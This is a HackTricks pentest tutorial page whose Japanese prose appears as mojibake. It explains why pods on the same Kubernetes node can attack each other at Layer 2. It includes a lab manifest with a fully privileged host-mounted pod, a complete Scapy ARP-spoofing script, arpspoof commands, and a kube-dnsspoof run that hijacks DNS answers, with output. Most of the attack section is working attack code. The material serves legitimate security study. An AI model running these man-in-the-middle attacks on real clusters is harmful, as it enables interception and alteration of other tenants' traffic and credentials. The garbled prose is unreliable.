# Kubernetes Network Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

Kubernetesã§ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®å‹•ä½œã«ã‚ˆã‚Šã€**åŒã˜ãƒãƒ¼ãƒ‰ã«å­˜åœ¨ã™ã‚‹ã™ã¹ã¦ã®ã‚³ãƒ³ãƒ†ãƒŠé–“ã§ã®æ¥ç¶šãŒç¢ºç«‹ã•ã‚Œã‚‹ã“ã¨ãŒè¨±å¯ã•ã‚Œã¦ã„ã‚‹**ã“ã¨ãŒè¦³å¯Ÿã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€åå‰ç©ºé–“ã®åŒºåˆ¥ã«é–¢ä¿‚ãªãé©ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚ˆã†ãªæ¥ç¶šã¯ã€**Layer 2**ï¼ˆã‚¤ãƒ¼ã‚µãƒãƒƒãƒˆï¼‰ã¾ã§æ‹¡å¼µã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®æ§‹æˆã¯ã‚·ã‚¹ãƒ†ãƒ ã‚’è„†å¼±æ€§ã«ã•ã‚‰ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚å…·ä½“çš„ã«ã¯ã€**æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒŠ**ãŒåŒã˜ãƒãƒ¼ãƒ‰ã«ã‚ã‚‹ä»–ã®ã‚³ãƒ³ãƒ†ãƒŠã«å¯¾ã—ã¦**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒ**ã‚’å®Ÿè¡Œã™ã‚‹å¯èƒ½æ€§ã‚’é–‹ãã¾ã™ã€‚ã“ã®æ”»æ’ƒä¸­ã€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã¯ã€ä»–ã®ã‚³ãƒ³ãƒ†ãƒŠã«å‘ã‘ã‚‰ã‚ŒãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’æ¬ºã„ã¦å‚å—ã¾ãŸã¯å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒã¯ã€**æ”»æ’ƒè€…ãŒãƒ­ãƒ¼ã‚«ãƒ«ã‚¨ãƒªã‚¢ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§å½ã®ARP**ï¼ˆã‚¢ãƒ‰ãƒ¬ã‚¹è§£æ±ºãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼‰ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**æ”»æ’ƒè€…ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®æ­£å½“ãªã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«ãƒªãƒ³ã‚¯ã•ã‚Œã¾ã™**ã€‚ã“ã®ã‚ˆã†ãªæ”»æ’ƒãŒæˆåŠŸè£ã«å®Ÿè¡Œã•ã‚ŒãŸå¾Œã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ã‚’å‚å—ã€å¤‰æ›´ã€ã¾ãŸã¯åœæ­¢ã™ã‚‹ã“ã¨ã•ãˆã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã¯OSIãƒ¢ãƒ‡ãƒ«ã®Layer 2ã§å®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€Kubernetesã«ãŠã‘ã‚‹ã“ã®ãƒ¬ã‚¤ãƒ¤ãƒ¼ã§ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®æ¥ç¶šæ€§ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ‡¸å¿µã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚

ã‚·ãƒŠãƒªã‚ªã§ã¯ã€4å°ã®ãƒã‚·ãƒ³ãŒä½œæˆã•ã‚Œã¾ã™ï¼š

* ubuntu-pe: ãƒãƒ¼ãƒ‰ã«é€ƒã’ã¦ãƒ¡ãƒˆãƒªã‚¯ã‚¹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®ç‰¹æ¨©ãƒã‚·ãƒ³ï¼ˆæ”»æ’ƒã«ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ï¼‰
* **ubuntu-attack**: **æ‚ªæ„ã®ã‚ã‚‹**ã‚³ãƒ³ãƒ†ãƒŠï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åå‰ç©ºé–“ï¼‰
* **ubuntu-victim**: **è¢«å®³è€…**ãƒã‚·ãƒ³ï¼ˆkube-systemåå‰ç©ºé–“ï¼‰
* **mysql**: **è¢«å®³è€…**ãƒã‚·ãƒ³ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åå‰ç©ºé–“ï¼‰
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## åŸºæœ¬çš„ãªKubernetesãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°

ã“ã“ã§ç´¹ä»‹ã•ã‚Œã¦ã„ã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã®ãƒˆãƒ”ãƒƒã‚¯ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€å‚è€ƒæ–‡çŒ®ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### ARP

ä¸€èˆ¬çš„ã«è¨€ãˆã°ã€**ãƒãƒ¼ãƒ‰å†…ã®ãƒãƒƒãƒ‰é–“ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°**ã¯ã€ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã‚’æ¥ç¶šã™ã‚‹**ãƒ–ãƒªãƒƒã‚¸**ã‚’ä»‹ã—ã¦åˆ©ç”¨å¯èƒ½ã§ã™ã€‚ã“ã®ãƒ–ãƒªãƒƒã‚¸ã¯ã€Œ**cbr0**ã€ã¨å‘¼ã°ã‚Œã¾ã™ã€‚ï¼ˆä¸€éƒ¨ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ç‹¬è‡ªã®ãƒ–ãƒªãƒƒã‚¸ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚ï¼‰**cbr0ã¯ARP**ï¼ˆã‚¢ãƒ‰ãƒ¬ã‚¹è§£æ±ºãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼‰è§£æ±ºã‚‚å‡¦ç†ã§ãã¾ã™ã€‚cbr0ã«åˆ°ç€ã—ãŸå—ä¿¡ãƒ‘ã‚±ãƒƒãƒˆã¯ã€ARPã‚’ä½¿ç”¨ã—ã¦å®›å…ˆMACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è§£æ±ºã§ãã¾ã™ã€‚

ã“ã®äº‹å®Ÿã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒãƒƒãƒ‰**ãŒã€**åŒã˜ãƒãƒ¼ãƒ‰å†…ã®ä»–ã®ãƒãƒƒãƒ‰ã¨é€šä¿¡**ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼ˆåå‰ç©ºé–“ã«é–¢ä¿‚ãªãï¼‰ã‚¤ãƒ¼ã‚µãƒãƒƒãƒˆãƒ¬ãƒ™ãƒ«ï¼ˆãƒ¬ã‚¤ãƒ¤ãƒ¼2ï¼‰ã§ã€‚

{% hint style="warning" %}
ã—ãŸãŒã£ã¦ã€**åŒã˜ãƒãƒ¼ãƒ‰å†…ã®ãƒãƒƒãƒ‰é–“ã§ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚**
{% endhint %}

### DNS

Kubernetesç’°å¢ƒã§ã¯ã€é€šå¸¸ã€kube-systemåå‰ç©ºé–“ã§1ã¤ï¼ˆã¾ãŸã¯ãã‚Œä»¥ä¸Šï¼‰ã®**DNSã‚µãƒ¼ãƒ“ã‚¹ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ã®ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
å‰ã®æƒ…å ±ã§ã¯ã€èˆˆå‘³æ·±ã„ã“ã¨ãŒè¦‹ã‚‰ã‚Œã¾ã™ã€‚**ã‚µãƒ¼ãƒ“ã‚¹ã®IP**ã¯**10.96.0.10**ã§ã™ãŒã€**ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒãƒƒãƒ‰ã®IP**ã¯**172.17.0.2**ã§ã™ã€‚

ä»»æ„ã®ãƒãƒƒãƒ‰å†…ã§DNSã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç¢ºèªã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
ã—ã‹ã—ã€ãƒãƒƒãƒ‰ã¯ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«åˆ°é”ã™ã‚‹æ–¹æ³•ã‚’**çŸ¥ã‚‰ãªã„**ãŸã‚ã€ã“ã®å ´åˆã®ãƒãƒƒãƒ‰ç¯„å›²ã¯172.17.0.10/26ã§ã™ã€‚

ã—ãŸãŒã£ã¦ã€ãƒãƒƒãƒ‰ã¯**ã‚¢ãƒ‰ãƒ¬ã‚¹10.96.0.10ã«DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡**ã—ã€cbr0ã«ã‚ˆã£ã¦**172.17.0.2ã«å¤‰æ›**ã•ã‚Œã¾ã™ã€‚

{% hint style="warning" %}
ã“ã‚Œã¯ã€ãƒãƒƒãƒ‰ã®**DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ãŒ**å¸¸ã«**ãƒ–ãƒªãƒƒã‚¸ã«è¡Œãã€**ã‚µãƒ¼ãƒ“ã‚¹IPã‚’ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆIPã«å¤‰æ›**ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ãŸã¨ãˆDNSã‚µãƒ¼ãƒãƒ¼ãŒãƒãƒƒãƒ‰ã¨åŒã˜ã‚µãƒ–ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã‚ã£ã¦ã‚‚ã§ã™ã€‚

ã“ã‚Œã‚’çŸ¥ã£ã¦ã„ã¦ã€**ARPæ”»æ’ƒãŒå¯èƒ½ã§ã‚ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ã„ã‚‹**å ´åˆã€ãƒãƒ¼ãƒ‰å†…ã®**ãƒãƒƒãƒ‰**ã¯**ã‚µãƒ–ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®å„ãƒãƒƒãƒ‰**ã¨**ãƒ–ãƒªãƒƒã‚¸**é–“ã®**ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’å‚å—**ã—ã€DNSã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®**DNSå¿œç­”ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ**DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼‰ã€‚

ã•ã‚‰ã«ã€**DNSã‚µãƒ¼ãƒãƒ¼**ãŒæ”»æ’ƒè€…ã¨**åŒã˜ãƒãƒ¼ãƒ‰**ã«ã‚ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ä»»æ„ã®ãƒãƒƒãƒ‰ã®**ã™ã¹ã¦ã®DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‚å—**ã—ï¼ˆDNSã‚µãƒ¼ãƒãƒ¼ã¨ãƒ–ãƒªãƒƒã‚¸ã®é–“ï¼‰ã€å¿œç­”ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## åŒã˜ãƒãƒ¼ãƒ‰å†…ã®ãƒãƒƒãƒ‰ã«ãŠã‘ã‚‹ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°

ç§ãŸã¡ã®ç›®æ¨™ã¯ã€**ubuntu-victimã‹ã‚‰mysqlã¸ã®é€šä¿¡ã‚’å°‘ãªãã¨ã‚‚ç›—ã‚€**ã“ã¨ã§ã™ã€‚

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

æ—¢ã«è¿°ã¹ãŸã‚ˆã†ã«ã€ã‚‚ã—ã‚ãªãŸãŒ**DNSã‚µãƒ¼ãƒãƒ¼ãƒãƒƒãƒ‰ã¨åŒã˜ãƒãƒ¼ãƒ‰ã®ãƒãƒƒãƒ‰ã‚’ä¾µå®³**ã—ãŸå ´åˆã€**ARPSpoofing**ã‚’ä½¿ã£ã¦**ãƒ–ãƒªãƒƒã‚¸ã¨DNS**ãƒãƒƒãƒ‰ã‚’**MitM**ã—ã€**ã™ã¹ã¦ã®DNSãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚ãªãŸã«ã¯ã€ã“ã‚Œã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã®ç´ æ™´ã‚‰ã—ã„**ãƒ„ãƒ¼ãƒ«**ã¨**ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«**ãŒã‚ã‚Šã¾ã™ [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

ç§ãŸã¡ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€**æ”»æ’ƒè€…ãƒãƒƒãƒ‰ã«**ã“ã®**ãƒ„ãƒ¼ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ã€**ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ã—ãŸã„**ãƒ‰ãƒ¡ã‚¤ãƒ³**ã‚’å«ã‚€\*\*`hosts`ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«\*\*ã‚’ä½œæˆã—ã¾ã™:
```
cat hosts
google.com. 1.1.1.1
```
ubuntu-victimãƒã‚·ãƒ³ã«å¯¾ã—ã¦æ”»æ’ƒã‚’å®Ÿè¡Œã—ã¾ã™:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
è‡ªåˆ†ã®DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã—ã‚ˆã†ã¨ã™ã‚‹å ´åˆã€**DNSå¿œç­”ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ã¯**ã€**æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€**å¿œç­”**ã«ã¯**æ‚ªæ„ã®ã‚ã‚‹****ãƒãƒƒãƒ‰**ã®**src IP**ãŒå«ã¾ã‚Œã€**å—ã‘å…¥ã‚Œã‚‰ã‚Œãªã„**ã‹ã‚‰ã§ã™ã€‚\
è¢«å®³è€…ãŒDNSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**DNS**ã®**src IP**ã‚’æŒã¤**æ–°ã—ã„DNSãƒ‘ã‚±ãƒƒãƒˆ**ã‚’ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã“ã‚Œã¯172.16.0.2ã®ã‚ˆã†ãªã‚‚ã®ã§ã€10.96.0.10ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã¯K8s DNSã‚µãƒ¼ãƒ“ã‚¹ã®IPã§ã‚ã‚Šã€DNSã‚µãƒ¼ãƒãƒ¼ã®IPã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚è©³ç´°ã¯ã‚¤ãƒ³ãƒˆãƒ­ãƒ€ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ã¾ã™ï¼‰ã€‚
{% endhint %}

## ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

ãƒ„ãƒ¼ãƒ«[**Mizu**](https://github.com/up9inc/mizu)ã¯ã€Kubernetesç”¨ã®ã‚·ãƒ³ãƒ—ãƒ«ã§ã‚ã‚ŠãªãŒã‚‰å¼·åŠ›ãªAPI **ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãƒ“ãƒ¥ãƒ¼ãƒ¯ãƒ¼**ã§ã€ãƒã‚¤ã‚¯ãƒ­ã‚µãƒ¼ãƒ“ã‚¹é–“ã®**ã™ã¹ã¦ã®APIé€šä¿¡**ã‚’**è¡¨ç¤º**ã—ã€ãƒ‡ãƒãƒƒã‚°ã‚„å›å¸°ã®ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚’æ”¯æ´ã—ã¾ã™ã€‚\
é¸æŠã—ãŸãƒãƒƒãƒ‰ã«ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€ãã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯æƒ…å ±ã‚’åé›†ã—ã¦ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã«è¡¨ç¤ºã—ã¾ã™ã€‚ãŸã ã—ã€ã“ã‚Œã«ã¯é«˜ã„K8sæ¨©é™ãŒå¿…è¦ã§ã™ï¼ˆã‚ã¾ã‚Šã‚¹ãƒ†ãƒ«ã‚¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
